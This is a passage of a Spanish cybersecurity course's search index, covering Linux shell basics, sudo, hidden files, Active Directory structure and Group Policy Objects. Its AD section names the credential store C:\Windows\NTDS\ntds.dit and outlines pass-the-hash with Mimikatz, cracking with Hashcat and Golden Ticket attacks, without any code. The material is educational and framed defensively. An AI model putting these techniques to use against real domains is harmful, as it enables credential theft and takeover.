par\u00e1metro en particular, en lugar de como un recurso general para aprender a usar la l\u00ednea de comandos. Sin embargo, la primera l\u00ednea de la secci\u00f3n DESCRIPCI\u00d3N responde a la pregunta de por qu\u00e9 no se han eliminado las l\u00edneas duplicadas: solo funciona en l\u00edneas coincidentes adyacentes.</p> <p>La pregunta, entonces, es c\u00f3mo reorganizar las l\u00edneas en nuestro archivo para que las entradas duplicadas est\u00e9n en l\u00edneas adyacentes. Si tuvi\u00e9ramos que ordenar el contenido del archivo alfab\u00e9ticamente, eso ser\u00eda suficiente. Unix ofrece un comando para hacer exactamente eso, <code>sort</code>. Una revisi\u00f3n r\u00e1pida del man muestra que podemos pasar un nombre de archivo directamente al comando, as\u00ed que veamos qu\u00e9 le hace a nuestro archivo:</p> <p><pre><code>sort combinado.txt | less\n</code></pre> Deber\u00edis poder ver que las l\u00edneas se han reordenado y ahora se han adecuado para conectarlas directamente con <code>uniq</code>. Finalmente podemos completar nuestra tarea de contar las l\u00edneas \u00fanicas en el archivo:</p> <pre><code>sort combinado.txt | uniq | wc -l\n</code></pre> <p>Como se puede ver, la capacidad de canalizar datos de un comando a otro, creando largas cadenas para manipular sus datos, es una herramienta poderosa. Por esta raz\u00f3n, ver\u00e9is que se usan con bastante frecuencia en las l\u00ednea de comandos. Una cadena larga de comandos puede parecer intimidante al principio, pero recordad que se puede dividir incluso la cadena m\u00e1s larga en comandos individuales (y mirar sus p\u00e1ginas de manual) para comprender mejor lo que est\u00e1 haciendo.</p>"},{"location":"section/EntLinux/#la-linea-de-comandos-y-el-superusuario","title":"La l\u00ednea de comandos y el superusuario","text":"<p>El superusuario es, como su nombre indica, un usuario con superpoderes. En los sistemas m\u00e1s antiguos, era un usuario real, con un nombre de usuario real (casi siempre \u201croot\u201d) que pod\u00eda iniciar sesi\u00f3n como si tuviera la contrase\u00f1a. </p> <p>En cuanto a esos superpoderes: root puede modificar o eliminar cualquier archivo en cualquier directorio del sistema, independientemente de qui\u00e9n sea el propietario; root puede reescribir las reglas del firewall o iniciar servicios de red que potencialmente podr\u00edan abrir la m\u00e1quina a un ataque; root puede apagar la m\u00e1quina incluso si otras personas todav\u00eda la est\u00e1n usando. En resumen, root puede hacer casi cualquier cosa, saltando f\u00e1cilmente las salvaguardas que generalmente se implementan para evitar que los usuarios sobrepasen sus l\u00edmites.</p> <p>Por supuesto, una persona que haya iniciado sesi\u00f3n como root es tan capaz de cometer errores como cualquier otra persona. Los anales de la historia de la inform\u00e1tica est\u00e1n llenos de historias de un comando mal escrito que borr\u00f3 todo un sistema de archivos o que acab\u00f3 con un servidor esencial. Adem\u00e1s existe la posibilidad de un ataque malicioso: si un usuario inicia sesi\u00f3n como root y abandona su escritorio, no es demasiado complicado para un colega descontento saltar a su m\u00e1quina y causar estragos.</p> <p>En un esfuerzo por reducir estos problemas, muchas distribuciones de Linux comenzaron a fomentar el uso del comando <code>su</code>. Es la abreviatura de 'superuser' y nos permite cambiar a otro usuario de la m\u00e1quina sin tener que hacer logout y login de nuevo. Cuando se usa sin argumentos, asume que se desea cambiar al usuario root, pero puede pasarle un nombre de usuario para cambiar a una cuenta de usuario espec\u00edfica. Fomentando el uso de <code>su</code> el objetivo era persuadir a los administradores para que pasaran la mayor parte de su tiempo usando una cuenta normal, que s\u00f3lo cambiaran a la cuenta de superusuario cuando lo necesitaran y luego usaran el comando <code>logout</code> (o el atajo Ctrl-D ) tan pronto como fuera posible para regresar a su usuario normal.</p> <p>Al minimizar la cantidad de tiempo que se pasa conectado como root , el uso de <code>su</code> reduce la ventana de oportunidad para cometer un error catastr\u00f3fico. A pesar de eso, siendo la naturaleza humana lo que es, muchos administradores han sido culpables de dejar abiertos terminales de larga duraci\u00f3n en los que sol\u00edan hacer <code>su</code> para cambiar a la cuenta de root. En ese sentido, sufue solo un peque\u00f1o paso adelante en materia de seguridad.</p> <p>Cuando se utiliza <code>su</code>  toda la sesi\u00f3n del terminal se cambia al otro usuario. Los comandos que no necesitan acceso de root, algo tan mundano como <code>pwd</code> o <code>ls</code>, se ejecutar\u00edan bajo los auspicios y permisos del superusuario, aumentando el riesgo de que un error en el programa cause problemas importantes. Peor a\u00fan, si pierde la pista de qu\u00e9 usuario est\u00e1 actuando en cada momento, se puede eejecutar un comando que fuera bastante benigno cuando se ejecuta como usuario, pero que podr\u00eda destruir todo el sistema si se ejecuta como root .</p> <p>Es mejor deshabilitar la cuenta de root por completo y luego, en lugar de permitir sesiones de terminal de larga duraci\u00f3n con poderes peligrosos, requerir que el usuario solicite espec\u00edficamente derechos de superusuario por comando. La clave de este enfoque es un comando llamado <code>sudo</code>( \u201cswitch user and do this command\u201d).</p> <p><code>sudo</code> se utiliza para preceder a un comando que debe ejecutarse con privilegios de superusuario. Se utiliza un archivo de configuraci\u00f3n para definir qu\u00e9 usuarios pueden usar <code>sudo</code> y qu\u00e9 comandos pueden ejecutar. Cuando se ejecuta un comando como este, se le solicita al usuario su propia contrase\u00f1a, que luego se almacena en cach\u00e9 durante un per\u00edodo de tiempo (por defecto es de 15 minutos), por lo que si necesita ejecutar varios comandos de nivel de superusuario, no se le siguen pidiendo cada vez.</p> <p>Un ejemplo de todo lo comentado hasta ahora, ser\u00eda:</p> <p></p> <p>\u00a1Cuidado con sudo!<p>Si se indica que debe ejecutarse un comando con <code>sudo</code>, asegur\u00e1os de comprender lo que hace el comando antes de continuar. Ejecutar con <code>sudo</code> le da a ese comando los mismos poderes que un superusuario.</p> </p>"},{"location":"section/EntLinux/#archivos-ocultos","title":"Archivos ocultos","text":"<p>Este tipo de archivos se usan com\u00fanmente en sistemas Linux para almacenar configuraciones y/o datos de configuraci\u00f3n y generalmente se ocultan simplemente para que no abarroten la vista de sus propios archivos. No hay nada especial en un archivo o carpeta ocultos, aparte de su nombre: simplemente comenzar un nombre con un punto (\u201d.\u201d) Es suficiente para que desaparezca.</p> <p><pre><code>cd /tmp/tutorial\nls\nmv combinado.txt .combinado.txt\nls\n</code></pre> A\u00fan se puede trabajar con el archivo oculto asegur\u00e1ndose de incluir el punto cuando especifique su nombre de archivo:</p> <p><pre><code>cat .combinado.txt\nmkdir .oculto\nmv .combinado.txt .oculto\nless .oculto/.combined.txt\n</code></pre> Si se ejecuta <code>ls</code>, se ver\u00e1 que el directorio .oculto est\u00e1, como era de esperar, oculto. A\u00fan se puede enumerar su contenido usando <code>ls .hidden</code>, pero como s\u00f3lo contiene un solo archivo que est\u00e1, as\u00edmismo, oculto, no se obtendr\u00e1n muchos resultados. Sin embargo, se puede utilizar la opci\u00f3n/switch -a  del comando <code>`ls</code> para hacer que se muestre todo en un directorio, incluyendo los archivos y carpetas ocultos:</p> <pre><code>ls\nls -a\nls .hidden\nls -a .hidden\n</code></pre> <p>Estos archivos normalmente almacenan la configuraci\u00f3n personal, y es as\u00ed como los sistemas Unix siempre han ofrecido la capacidad de tener configuraciones a nivel de sistema (generalmente en /etc) que pueden ser anuladas por usuarios individuales (cortes\u00eda de archivos ocultos en su directorio de inicio).</p>"},{"location":"section/EntWin/","title":"Entornos Windows","text":""},{"location":"section/EntWin/#active-directory","title":"Active Directory","text":"<p>Empresas de todos los tama\u00f1os en todo el mundo utilizan Active Directory para administrar los permisos y controlar el acceso a los recursos cr\u00edticos de la red empresarial. Pero, \u00bfqu\u00e9 es exactamente y c\u00f3mo afecta al negocio?</p>"},{"location":"section/EntWin/#que-es-active-directory","title":"\u00bfQu\u00e9 es Active Directory?","text":"<p>Active Directory (AD) es un servicio de directorio que se ejecuta en Microsoft Windows Server. Un directorio es una estructura jer\u00e1rquica que almacena informaci\u00f3n sobre los objetos en la red. </p> <p>La funci\u00f3n principal de Active Directory (AD) es proporcionar un servicio de directorio centralizado para la administraci\u00f3n y autenticaci\u00f3n de usuarios y recursos en una red. Desarrollado por Microsoft, Active Directory permite gestionar informaci\u00f3n y controlar el acceso a recursos dentro de una red empresarial</p> <p>Active Directory usa un almac\u00e9n de datos estructurado como base para una organizaci\u00f3n jer\u00e1rquica l\u00f3gica de la informaci\u00f3n del directorio.</p> <p>Sus funciones principales son:</p> <ol> <li>Gesti\u00f3n de identidades y autenticaci\u00f3n: Active Directory almacena informaci\u00f3n sobre los usuarios, como nombres, contrase\u00f1as y permisos, facilitando la autenticaci\u00f3n de los usuarios cuando inician sesi\u00f3n en una red. Utiliza el protocolo Kerberos para garantizar una autenticaci\u00f3n segura.</li> <li>Control de acceso: Permite a los administradores definir qui\u00e9n tiene acceso a recursos espec\u00edficos, como archivos, impresoras, o aplicaciones. Las pol\u00edticas de grupo (Group Policy) en AD permiten administrar configuraciones de seguridad y restricciones a nivel de usuario o de equipo.</li> <li>Centralizaci\u00f3n: AD permite una administraci\u00f3n centralizada de toda la red. Desde un solo punto (el Controlador de Dominio), los administradores pueden gestionar cuentas de usuarios, permisos, y pol\u00edticas de seguridad en todos los dispositivos conectados al dominio.</li> <li>Organizaci\u00f3n jer\u00e1rquica de objetos: Active Directory organiza los recursos de la red, como usuarios, grupos, computadoras y dispositivos, en una estructura jer\u00e1rquica. Esta estructura incluye dominios, \u00e1rboles y bosques, lo que facilita el acceso y la gesti\u00f3n de los recursos.</li> <li>Escalabilidad: Es adecuado tanto para peque\u00f1as redes como para grandes entornos empresariales con m\u00faltiples sitios y miles de usuarios. La replicaci\u00f3n de AD permite mantener sincronizados los controladores de dominio en diferentes ubicaciones.</li> <li>Autorizaci\u00f3n y seguridad: Adem\u00e1s de la autenticaci\u00f3n, AD tambi\u00e9n controla la autorizaci\u00f3n para determinar qu\u00e9 recursos pueden usar los usuarios una vez autenticados. AD refuerza la seguridad mediante pol\u00edticas de contrase\u00f1as y otros m\u00e9todos de autenticaci\u00f3n avanzada.</li> </ol> <p>Definici\u00f3n</p> <p>El directorio activo o Active Directory (AD) es una manera de organizar y gestionar todos los elementos de una red inform\u00e1tica: ordenadores, grupos, usuarios, dominios, pol\u00edticas de seguridad, y cualquier tipo de objetos definidos para el usuario. </p> <p>AD simplifica la vida de los administradores y usuarios finales al tiempo que mejora la seguridad de las organizaciones a trav\u00e9s de la funci\u00f3n pol\u00edticas de grupo de AD. </p> <p>Los usuarios pueden autenticarse una vez y luego acceder sin problemas a cualquier recurso en el dominio para el que est\u00e1n autorizados (inicio de sesi\u00f3n \u00fanico). </p> <p>Adem\u00e1s, los archivos se almacenan en un repositorio central donde se pueden compartir con otros usuarios para facilitar la colaboraci\u00f3n y los equipos de TI pueden  respaldarlos adecuadamente para garantizar la continuidad del negocio.</p> <p></p>"},{"location":"section/EntWin/#antes-de-nada-que-es-un-dominio","title":"Antes de nada, \u00bfqu\u00e9 es un dominio?","text":"<p>Un dominio representa una agrupaci\u00f3n l\u00f3gica de un conjunto ordenadores, usuarios y servicios conectados en una red los cuales comparten una base de datos de Active Directory. La base de base de datos es probablemente el elemento m\u00e1s importante en un AD (Active Directory) y es gestionada por los servidores centrales del dominio, tambi\u00e9n conocidos como Domain Controllers. </p> <p>Un dominio b\u00e1sicamente es una etiqueta que t\u00edpicamente representa un nombre DNS, el cual en algunas organizaciones es el mismo que su sitio web, pero no tiene porque ser as\u00ed en todos los casos y es posible que la organizaci\u00f3n prefiera utilizar otro nombre de dominio que ser\u00e1 al que se unir\u00e1n las estaciones de trabajo.</p>"},{"location":"section/EntWin/#que-son-los-domain-services-sevicios-de-dominio-de-active-directory","title":"\u00bfQu\u00e9 son los Domain Services (sevicios de dominio) de Active Directory?","text":"<p>Los servicios de dominio de Active Directory (AD DS) son un componente central de Active Directory y proporcionan el mecanismo principal para autenticar a los usuarios y determinar a qu\u00e9 recursos de red pueden acceder. Los servidores que ejecutan AD DS se denominan controladores de dominio (DC). \u00c9stos son sistemas basados en Windows Server que pueden acceder y manipular la base de datos del AD. Cada dominio tiene como m\u00ednimo un controlador, por lo que si por ejemplo, un departamento o unidad de negocio crece m\u00e1s de lo esperado, es posible instalar m\u00e1s controladores de dominio dedicados a procesar las solicitudes de las estaciones de trabajo en ese departamento. Tambi\u00e9n es posible crear subdominios para que los usuarios puedan acceder a los recursos en otros subdominios que hagan parte del mismo Forest.</p> <p>Las organizaciones normalmente tienen varios DC y cada uno tiene una copia del directorio para todo el dominio. Los cambios realizados en el directorio en un controlador de dominio, como la actualizaci\u00f3n de la contrase\u00f1a o la eliminaci\u00f3n de una cuenta de usuario, se replican en los otros controladores de dominio para que todos est\u00e9n actualizados. </p> <p>AD DS tambi\u00e9n proporciona caracter\u00edsticas adicionales como inicio de sesi\u00f3n \u00fanico (SSO) mediante Kerberos, certificados de seguridad, LDAP (protocolo ligero de acceso a directorios) y administraci\u00f3n de derechos de acceso.</p> <p></p>"},{"location":"section/EntWin/#la-estructura-jerarquica-de-los-servicios-de-dominio-de-active-directory","title":"La estructura jer\u00e1rquica de los servicios de dominio de Active Directory","text":"<p>Los dominios en AD son muy flexibles y permiten crear una infraestructura completa y bien organizada. Partiendo de un dominio ra\u00edz, es posible crear subdominios que representen la disposici\u00f3n f\u00edsica y/o l\u00f3gica de las estaciones de trabajo. Esto significa que se puede crear un subdominio para el departamento de ventas, IT, marketing, etc. Tambi\u00e9n se podr\u00eda crear subdominios para las oficinas que se encuentran distribuidas en diferentes ubicaciones geogr\u00e1ficas. Evidentemente, se trata de decisiones de dise\u00f1o a la hora de configurar la red.</p> <p>AD DS organiza los datos en una estructura jer\u00e1rquica que consta de dominios, \u00e1rboles y bosques, como se detalla a continuaci\u00f3n.</p> <ul> <li> <p>Dominios: un dominio representa un grupo de objetos, como usuarios, grupos y dispositivos, que comparten la misma base de datos de AD. Puedes pensar en un dominio como una rama en un \u00e1rbol. Un dominio tiene la misma estructura que los dominios y subdominios est\u00e1ndar, por ejemplo, tudominio.com y ventas.tudominio.com.</p> <p>Un dominio representa un l\u00edmite de administraci\u00f3n. Los objetos de un dominio determinado se almacenan en una \u00fanica base de datos y se pueden administrar juntos.</p> </li> <li> <p>\u00c1rboles: un \u00e1rbol es uno o m\u00e1s dominios agrupados en una jerarqu\u00eda l\u00f3gica. Dado que los dominios de un \u00e1rbol est\u00e1n relacionados, se dice que \"conf\u00edan\" entre s\u00ed.</p> </li> <li> <p>Bosque: un bosque es el nivel m\u00e1s alto de organizaci\u00f3n dentro de AD y contiene un grupo de \u00e1rboles. Los \u00e1rboles de un bosque tambi\u00e9n pueden confiar entre s\u00ed y tambi\u00e9n compartir\u00e1n esquemas de directorio, cat\u00e1logos, informaci\u00f3n de aplicaciones y configuraciones de dominio.</p> <p>El bosque define los l\u00edmites de seguridad y los confines de confianza en una red. Todos los objetos dentro de un bosque comparten una configuraci\u00f3n de seguridad com\u00fan. Los objetos de diferentes bosques no pueden interactuar entre s\u00ed a menos que los administradores de cada bosque creen una relaci\u00f3n de confianza entre ellos</p> </li> <li> <p>Unidades organizativas: una unidad organizativa permite, como su propio nombre indica, organizar y agrupar usuarios, grupos, equipos y otras unidades organizativas. Son contenedores dentro de un dominio que permiten organizar de manera l\u00f3gica los objetos (usuarios, equipos, grupos) para una administraci\u00f3n m\u00e1s f\u00e1cil</p> <p>Las OUs se pueden anidar, lo que facilita la creaci\u00f3n de una estructura jer\u00e1rquica que refleja la organizaci\u00f3n real (por ejemplo, departamentos o ubicaciones geogr\u00e1ficas).</p> </li> <li> <p>Contenedores: un contenedor es similar a una unidad organizativa; sin embargo, a diferencia de una unidad organizativa, no es posible vincular un objeto de directiva de grupo (GPO) a un contenedor gen\u00e9rico de Active Directory.</p> </li> </ul> <p></p> <p></p> <p></p> <p></p>"},{"location":"section/EntWin/#otros-servicios-de-active-directory","title":"Otros servicios de Active Directory","text":"<p>Adem\u00e1s de los servicios de dominio de Active Directory, hay varios otros servicios cr\u00edticos que proporciona AD. Algunos de esos servicios se enumeran a continuaci\u00f3n:</p> <p>Servicios de directorio ligeros: AD LDS es un servicio de directorio del Protocolo ligero de acceso a directorios (LDAP). Proporciona solo un subconjunto de las funciones de AD DS, lo que lo hace m\u00e1s vers\u00e1til en t\u00e9rminos de d\u00f3nde se puede ejecutar. Por ejemplo, se puede ejecutar como un servicio de directorio independiente sin necesidad de integrarse con una implementaci\u00f3n completa de Active Directory. Se utiliza para aplicaciones que necesitan un servicio de directorio pero que no requieren el entorno completo de un dominio, como aplicaciones de autenticaci\u00f3n de usuarios para sistemas o aplicaciones espec\u00edficas.</p> <p>Servicios de certificados: AD CS gestiona la infraestructura de claves p\u00fablicas (PKI), lo que permite emitir, gestionar y validar certificados digitales. Estos certificados pueden utilizarse para la autenticaci\u00f3n de usuarios, dispositivos y aplicaciones, as\u00ed como para cifrado de datos y comunicaciones.</p> <p>Servicios de federaci\u00f3n de Active Directory: ADFS es una soluci\u00f3n de inicio de sesi\u00f3n \u00fanico (SSO) para AD que permite a los empleados acceder a m\u00faltiples aplicaciones con un \u00fanico conjunto de credenciales, lo que simplifica la experiencia del usuario.</p> <p>Servicios de administraci\u00f3n de derechos: AD RMS es un servicio que proporciona protecci\u00f3n de la informaci\u00f3n mediante la aplicaci\u00f3n de pol\u00edticas de derechos digitales (DRM) a documentos y correos electr\u00f3nicos. Esto garantiza que solo los usuarios autorizados puedan ver o editar la informaci\u00f3n protegida. AD RMS se utiliza para proteger la propiedad intelectual y datos sensibles en archivos, correos electr\u00f3nicos y documentos, al limitar qui\u00e9n puede acceder a, editar o reenviar esa informaci\u00f3n, incluso despu\u00e9s de ser descargada o copiada.</p> <p>El servidor que aloja AD DS se denomina controlador de dominio (DC). Tambi\u00e9n se puede usar un controlador de dominio para autenticarse con otros productos de MS, como Exchange Server, SharePoint Server, SQL Server, File Server u otros.</p> Servicio Funci\u00f3n Uso AD DS (Domain Services) Autenticaci\u00f3n y gesti\u00f3n de identidades Administrar usuarios y recursos en redes empresariales AD LDS (Lightweight Directory) Versi\u00f3n ligera de AD, usa LDAP para aplicaciones Aplicaciones que requieren un directorio, sin necesidad de dominio AD CS (Certificate Services) Infraestructura de claves p\u00fablicas y certificados Autenticaci\u00f3n con certificados, SSL/TLS, cifrado AD FS (Federation Services) Federaci\u00f3n de identidades, Single Sign-On (SSO) Integraci\u00f3n con aplicaciones externas, SSO entre dominios AD RMS (Rights Management) Protecci\u00f3n de datos y derechos digitales (DRM) Control de acceso y protecci\u00f3n de documentos y correos electr\u00f3nicos LDAP Protocolo para acceder y gestionar servicios de directorio Autenticaci\u00f3n y gesti\u00f3n de recursos desde aplicaciones Replication Services Replicaci\u00f3n de datos entre controladores de dominio Consistencia de la base de datos de AD en todas las ubicaciones <p>Atenci\u00f3n</p> <p>El controlador de dominio, hablando de ciberseguridad en entornos Windows, es la joya de la corona. </p> <p>Bien sea realizando un pentest legal, bien sea un ataque malintencionado por parte de ciberdelincuentes, el fin \u00faltimo siempre ser\u00e1 llegar a ser administrador del Controlador de Dominio (DC). </p> <p>Por ello es tremendamente importante conocer su complejo funcionamiento y saber fortificarlo en la medida de lo posible para protegernos frente a los ataques m\u00e1s comunes.</p>"},{"location":"section/EntWin/#usuarios-de-ad","title":"Usuarios de AD","text":"<p>Entre otras cosas, Active Directory gestiona los usuarios del entorno trat\u00e1ndolos como un tipo de objeto especial que se almacena en la base de datos central. A continuaci\u00f3n se listan algunas cuestiones importantes a tener en cuenta sobre los usuarios de un dominio.</p> <ul> <li> <p>Aunque el nombre de usuario sirve para identificarle, el SID (Security Identifier) tambi\u00e9n puede ser utilizado para dicho fin. El SID es la combinaci\u00f3n del Domain SID y el RID (Relative Identifier). Algunas herramientas ense\u00f1an el SID en lugar del nombre de usuario, por ese motivo es importante saber esto. </p> <p>El SID asegura la correcta aplicaci\u00f3n de permisos y controles de acceso en entornos Windows. Es fundamental para la administraci\u00f3n de la seguridad y la gesti\u00f3n de identidades en redes corporativas.</p> </li> <li> <p>Los user secrets son elementos utilizados por el Domain Controller para realizar el proceso de autenticaci\u00f3n. Las contrase\u00f1as no se guardan en texto plano, pero los user secrets derivados de ellas s\u00ed, los cuales son Hashes NT y claves Kerberos.</p> </li> <li> <p>Los hashes LM y NT son almacenados en dos sitios: La SAM (Security Account Manager) de Windows y (en entornos de dominio) en la base de datos del AD, la cual por defecto se encuentra disponible en los DC en la ruta C:\\Windows\\NTDS\\ntds.dit.</p> </li> <li> <p>Aunque los hashes NT no son contrase\u00f1as, se pueden utilizar en algunos casos para ataques del tipo Pass-The-Hash/Overpass-The-Hash</p> </li> <li> <p>Los ordenadores registrados en un AD tambi\u00e9n est\u00e1n representados por una cuenta de usuario, la cual es el nombre de la estaci\u00f3n de trabajo con un \u201c$\u201d al final.</p> </li> <li> <p>Probablemente las cuentas de usuario m\u00e1s importantes son Administrator y krbtgt. La primera tiene privilegios altos en el sistema y la segunda permite el cifrado de los tickets TGT, lo que significa que si un atacante compromete dicha cuenta podr\u00e1 crear este tipo de tickets sin problema. A esta t\u00e9cnica se le conoce como Golden Ticket.</p> </li> </ul>"},{"location":"section/EntWin/#base-de-datos-ntds","title":"Base de datos NTDS","text":"<p>La base de datos de un AD contiene todos los objetos que se encuentran disponibles en el entorno y se comparte/sincroniza con todos los DC. Por defecto, se encuentra ubicada en el fichero C:\\Windows\\NTDS\\ntds.dit de cada DC. Por otro lado, la NTDS se caracteriza por dos cosas:</p> <ul> <li>Es una base de datos distribuida.</li> <li>Cuenta con una estructura basada en objetos y jerarqu\u00edas de clases.</li> </ul> <p>El archivo NTDS.dit es una base de datos que almacena datos de Active Directory, incluida informaci\u00f3n sobre objetos de usuario, grupos y pertenencia a grupos. Incluye los hashes NTLM  de las contrase\u00f1as para todos los usuarios y computadores.</p> <p>En entornos con m\u00faltiples controladores de dominio, NTDS.dit permite la replicaci\u00f3n de datos entre estos controladores, asegurando que todos tengan copias actualizadas de la base de datos de Active Directory.</p> <p>Este archivo utiliza un formato de base de datos basado en Extensible Storage Engine (ESE), que es el mismo motor de base de datos utilizado en otras aplicaciones de Microsoft, como Microsoft Exchange.</p> <p>Al extraer estos hashes, es posible utilizar herramientas como Mimikatz para realizar ataques de pass-the-hash o herramientas como Hashcat para descifrar estas contrase\u00f1as. La extracci\u00f3n y el descifrado de estas contrase\u00f1as se pueden realizar sin conexi\u00f3n, por lo que ser\u00e1n indetectables. Una vez que un atacante ha extra\u00eddo estos hashes, puede actuar como cualquier usuario, incluidos los administradores de dominio.</p>"},{"location":"section/EntWin/#gpos","title":"GPOs","text":""},{"location":"section/EntWin/#que-es-una-directiva-de-grupo","title":"\u00bfQu\u00e9 es una directiva de grupo?","text":"<p>Lo primero es lo primero, \u00bfqu\u00e9 es una directiva de grupo? La directiva de grupo es una caracter\u00edstica de Windows que facilita una amplia variedad de configuraciones avanzadas que los administradores de sistemas pueden usar para controlar el entorno de trabajo de los usuarios y las cuentas de usuario en Active Directory. </p> <p>B\u00e1sicamente, proporciona un lugar centralizado para que los administradores administren y configuren los sistemas operativos, las aplicaciones y los ajustes de los usuarios.</p> <p>Las pol\u00edticas de grupo, cuando se usan correctamente, permiten aumentar la seguridad de las computadoras de los usuarios y ayudarlo a defenderse tanto de las amenazas internas como de los ataques externos.</p>"},{"location":"section/EntWin/#que-es-un-objeto-de-directiva-de-grupo-o-group-policy-object-gpo","title":"\u00bfQu\u00e9 es un objeto de directiva de grupo o Group Policy Object (GPO)?","text":"<p>Un objeto de directiva de grupo (GPO) es un grupo de configuraciones que se crean mediante el Editor de directivas de grupo de Microsoft Management Console (MMC). Los GPO se pueden asociar con uno o varios contenedores de Active Directory, incluidos sitios, dominios o unidades organizativas (OU). MMC permite a los usuarios crear GPO que definen pol\u00edticas basadas en el registro, opciones de seguridad, instalaci\u00f3n de software y mucho m\u00e1s.</p> <p>Active Directory aplica los GPO en el mismo orden l\u00f3gico; pol\u00edticas locales, pol\u00edticas de sitio, pol\u00edticas de dominio y pol\u00edticas de OU.</p> <p>Nota</p> <p>Nota: Los GPO que est\u00e1n en unidades organizativas anidadas funcionan primero desde la unidad organizativa m\u00e1s cercana a la ra\u00edz y desde all\u00ed hacia afuera.</p>"},{"location":"section/EntWin/#ejemplos-de-gpo","title":"Ejemplos de GPO","text":"<p>Los Objetos de directiva de grupo o GPO se pueden usar de varias formas para que beneficien a la seguridad. A continuaci\u00f3n se muestran algunos ejemplos concretos:</p> <ul> <li> <p>Una GPO podr\u00eda usarse para determinar la p\u00e1gina de inicio que un usuario ve cuando inicia su navegador de Internet despu\u00e9s de iniciar sesi\u00f3n en el dominio.</p> </li> <li> <p>Los administradores pueden usar GPO para definir qu\u00e9 impresoras conectadas a la red aparecen en la lista de impresoras disponibles despu\u00e9s de que un usuario en una OU de Active Directory espec\u00edfica inicia sesi\u00f3n en el dominio.</p> </li> <li> <p>Los administradores tambi\u00e9n pueden usar GPO para modificar una serie de protocolos y pr\u00e1cticas de seguridad, como restringir las opciones de conexi\u00f3n a Internet, los programas e incluso el tiempo de pantalla inactiva.</p> </li> <li> <p>Restringir el acceso al panel de control y Configuraci\u00f3n</p> <p> </p> </li> <li> <p>Bloquear acceso al s\u00edmbolo del sistema</p> </li> <li> <p>Impedir la instalaci\u00f3n de software </p> </li> <li> <p>Desactivar las actualizaciones autom\u00e1ticas de controladores.</p> <p> </p> </li> </ul>"},{"location":"section/EntWin/#como-se-procesan-los-objetos-de-directiva-de-grupo","title":"\u00bfC\u00f3mo se procesan los objetos de directiva de grupo?","text":"<p>El orden en el que se procesan los GPO afecta la configuraci\u00f3n que se aplica al equipo y al usuario. </p> <p>El orden en que se procesan los GPO se conoce como LSDOU, que significa local, sitio(una especie de subred en nuestro dominio), dominio, unidad organizativa. La pol\u00edtica de la computadora local es la primera en ser procesada, seguida del nivel del sitio a las pol\u00edticas de AD de dominio, y finalmente en las unidades de la organizaci\u00f3n. Si hay pol\u00edticas en conflicto en LSDOU, las \u00faltimas pol\u00edticas aplicadas ganan.</p> <p></p>"},{"location":"section/EntWin/#beneficios-de-las-gpos","title":"Beneficios de las GPOs","text":"<p>Los beneficios de la pol\u00edtica de grupo no se limitan \u00fanicamente a la seguridad, hay una serie de otras ventajas que vale la pena mencionar.</p> <ul> <li> <p>Pol\u00edtica de contrase\u00f1as: muchas empresas tienen pol\u00edticas de contrase\u00f1as demasiado laxas, y muchos usuarios a menudo tienen contrase\u00f1as configuradas para que nunca caduquen. </p> <p>Las contrase\u00f1as que no se rotan regularmente, son demasiado simples o usan palabras comunes corren el riesgo de ser vulneradas por fuerza bruta. Los GPO se pueden utilizar para establecer la longitud, la complejidad y otros requisitos de la contrase\u00f1a.</p> </li> <li> <p>Gesti\u00f3n de sistemas: los GPO se pueden utilizar para simplificar tareas sencillas y repetitivas, ahorrando as\u00ed mucho tiempo. Pueden ahorrar horas y horas de configuraci\u00f3n del entorno de nuevos usuarios y equipos que se unen al dominio mediante el uso de GPOs para aplicar una configuraci\u00f3n universal y est\u00e1ndar.</p> </li> <li> <p>Verificaci\u00f3n de estado: los GPO se pueden usar para implementar actualizaciones de software y parches del sistema para garantizar que su entorno est\u00e9 en buen estado y actualizado contra las \u00faltimas amenazas de seguridad.</p> </li> </ul>"},{"location":"section/EntWin/#limitaciones-de-las-gpos","title":"Limitaciones de las GPOs","text":"<p>Estar\u00edamos faltando a la verdad si dijeramos que los GPO son la f\u00f3rmula m\u00e1gica para mantener los datos seguros. Hay una serie de limitaciones que se deben conocer.</p> <p>En primer lugar, el editor de GPO no es la consola m\u00e1s f\u00e1cil de usar, m\u00e1s bien es un tanto adusto. Un conocimiento profundo de PowerShell ayudar\u00e1 a que sea m\u00e1s f\u00e1cil realizar todas las actualizaciones de GPO, lo cual complica m\u00e1s la cosa si cabe.</p> <p>Las actualizaciones de GPO, se realizan aleatoriamente cada 90 a 120 minutos cada vez que se reinicia la computadora.Puede espec\u00edficarse una tasa de actualizaci\u00f3n desde 0 minutos hasta 45 d\u00edas. Sin embargo, si se especifican 0 minutos, entonces, de forma predeterminada, las GPO intentar\u00e1n actualizarse cada 7 segundos, lo que probablemente inunde la red de tr\u00e1fico.</p> <p>Los GPO tampoco son inmunes a los ciberataques. Si un atacante quisiera cambiar las GPO locales en una computadora para moverse lateralmente a trav\u00e9s de la red, ser\u00eda muy dif\u00edcil detectarlo sin una soluci\u00f3n de auditor\u00eda y monitoreo de pol\u00edticas de grupo implementada.</p>"},{"location":"section/webgrafia/","title":"Fuentes utilizadas en los apuntes","text":"<p>\u00c1rbol de directorios en Linux </p> <p>Archwiki - Usuarios y grupos</p> <p>Manuel Mujica -Permisos Linux</p> <p>Linux.com -File permissions</p> <p>baeldung.com - Advanced Permissions in Linux</p> <p>geeksforgeeks.com - Permissions in Linux</p> <p>The command line for beginners</p> <p>The hacker way - Pentesting AD</p> <p>Microsoft - AD</p> <p>LM, NTLM, Net-NTLMv2, oh my!</p> <p>GPOs</p> <p>Escalada de privilegios</p> <p>NTLM vs. Kerberos: What\u2019s the Difference?</p> <p>Identity &amp; Access Microsoft Improving Windows Authentication, Disabling NTLM</p> <p>LM, NTLM, Net-NTLMv2, oh my!</p> <p>NTLM and other hash cracking techniques</p>"},{"location":"segdef/","title":"Apuntes y ejercicios pr\u00e1cticas del curso de especializaci\u00f3n ciberseguridad","text":"<p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  expuestos.</p>"},{"location":"segdef/arkime/","title":"Analizando tr\u00e1fico de red con Arkime","text":""},{"location":"segdef/arkime/#mitre-attck","title":"MITRE ATT&amp;CK","text":"<p>\u00bfHas escuchado de MITRE ATT&amp;CK? ATT&amp;CK por sus siglas en ingl\u00e9s, significa: \"t\u00e1cticas, 